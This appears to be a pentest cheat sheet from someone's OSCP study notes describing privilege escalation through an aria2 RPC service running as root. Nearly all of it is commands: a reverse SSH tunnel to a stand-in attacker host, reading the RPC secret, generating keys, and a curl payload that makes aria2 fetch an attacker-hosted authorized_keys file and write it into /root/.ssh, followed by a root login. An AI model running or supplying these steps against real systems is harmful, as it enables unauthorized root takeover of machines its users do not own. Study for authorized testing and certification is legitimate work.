# Aria2 Privilege Escalation

Port: 6800

## Requirements:

There is a service that runs as root and locate the RPC secret.

### 1) If it runs internally, expose the RPC service via port forwarding

If we have SSH credentials

    ssh -L 6800:127.0.0.1:6800 user@IP

If not, use a tool like a chisel, OR do a remote port forwarding

    ssh -R 6800:127.0.0.1:6800 attacker@ATTACK_IP

### 2) Extract the RPC secret

    cat /etc/systemd/system/aria2.service

Search for any files related to aria2

    find / -iname aria2* -type f 2>/dev/null

### 3) Create a pair of SSH keys, and store them in a temporary folder

    ssh-keygen -t rsa

Rename the keys

    Enter file in which to save the key (/home/kaiser/.ssh/id_rsa): /home/kaiser/Desktop/OSCP/root-id_rsa

    mv root-id_rsa.pub authorized_keys

Give appropriate permissions to the private key

    chmod 600 root-id_rsa

### 4) Write the public key on the target machine using the aria2 service

    curl http://localhost:6800/jsonrpc -d '{"jsonrcp":"2.0","id":"root","method":"aria2.addUri","params":["token:RPC_SECRET",["http://192.168.45.200/authorized_keys"],{"out":"/root/.ssh/authorized_keys"}]}'

### 5) Login as root

    ssh root@TARGET_IP -i root-id_rsa
